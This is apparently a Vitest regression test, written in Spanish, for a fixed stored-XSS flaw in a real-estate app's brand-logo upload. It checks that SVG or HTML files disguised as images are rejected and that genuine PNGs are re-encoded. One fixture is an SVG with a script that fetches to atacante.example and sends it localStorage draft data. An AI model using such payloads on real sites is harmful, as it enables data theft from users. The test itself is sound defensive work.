/**
 * Regresion de F-03 (review adversarial, severidad high):
 *
 * El onboarding aceptaba `image/svg+xml` confiando solo en `File.type`, y la
 * ruta `/uploads/brand/<archivo>` lo servia inline y same-origin. Un logo con
 * <script> se ejecutaba con el origen de la app: podia leer el borrador de
 * propiedad de localStorage (que incluye privateAddress e internalName) y
 * llamar a cualquier API, porque v1 no tiene auth.
 *
 * Ahora: solo raster (PNG/WebP/JPG) Y recodificado con sharp, de forma que el
 * MIME declarado por el navegador deja de ser la unica prueba del contenido.
 */
import { afterAll, describe, expect, it } from "vitest";
import { readFile, rm } from "node:fs/promises";
import path from "node:path";
import { brandDir } from "@/lib/infrastructure/storage/upload-paths";
import sharp from "sharp";
import { storeBrandLogo } from "@/app/(main)/(setup)/onboarding/actions";
import { brandConfigSchema } from "@/niches/inmobiliaria/brand.schema";

const UPLOAD_DIR = brandDir();
const written: string[] = [];

const MALICIOUS_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <script>fetch('https://atacante.example/?d='+localStorage.getItem('inmo:property-draft'))</script>
  <rect width="200" height="200" fill="#c1440e"/>
</svg>`;

function asFile(bytes: Buffer | string, name: string, type: string): File {
  const data = typeof bytes === "string" ? Buffer.from(bytes, "utf8") : bytes;
  return new File([new Uint8Array(data)], name, { type });
}

async function realPng(): Promise<Buffer> {
  return sharp({
    create: {
      width: 400,
      height: 200,
      channels: 4,
      background: { r: 193, g: 68, b: 14, alpha: 1 },
    },
  })
    .png()
    .toBuffer();
}

afterAll(async () => {
  await Promise.all(
    written.map((publicPath) =>
      rm(path.join(UPLOAD_DIR, path.basename(publicPath)), { force: true }),
    ),
  );
});

describe("logo de marca — nada de contenido activo", () => {
  it("rechaza un SVG declarado como tal", async () => {
    await expect(
      storeBrandLogo(asFile(MALICIOUS_SVG, "logo.svg", "image/svg+xml")),
    ).rejects.toThrow("LOGO_TYPE_UNSUPPORTED");
  });

  it("rechaza un SVG que miente sobre su MIME (declara image/png)", async () => {
    await expect(
      storeBrandLogo(asFile(MALICIOUS_SVG, "logo.png", "image/png")),
    ).rejects.toThrow("LOGO_CONTENT_INVALID");
  });

  it("rechaza HTML disfrazado de WebP", async () => {
    await expect(
      storeBrandLogo(
        asFile("<html><script>alert(1)</script></html>", "logo.webp", "image/webp"),
      ),
    ).rejects.toThrow("LOGO_CONTENT_INVALID");
  });

  it("guarda un PNG real recodificado y con extension coherente", async () => {
    const publicPath = await storeBrandLogo(
      asFile(await realPng(), "Logo Postiguet!.png", "image/png"),
    );
    written.push(publicPath);

    expect(publicPath).toMatch(/^\/uploads\/brand\/[^/\\]+\.png$/);

    const bytes = await readFile(path.join(UPLOAD_DIR, path.basename(publicPath)));
    const metadata = await sharp(bytes).metadata();
    expect(metadata.format).toBe("png");
    expect(metadata.exif).toBeUndefined();
  });

  it("la ruta guardada pasa el schema de marca", async () => {
    const publicPath = await storeBrandLogo(
      asFile(await realPng(), "logo.png", "image/png"),
    );
    written.push(publicPath);

    const logoField = brandConfigSchema.shape.logo.safeParse(publicPath);
    expect(logoField.success).toBe(true);
  });

  it("rechaza logos por encima de 5MB antes de decodificarlos", async () => {
    const huge = Buffer.alloc(5 * 1024 * 1024 + 1);
    await expect(
      storeBrandLogo(asFile(huge, "enorme.png", "image/png")),
    ).rejects.toThrow("LOGO_TOO_LARGE");
  });
});
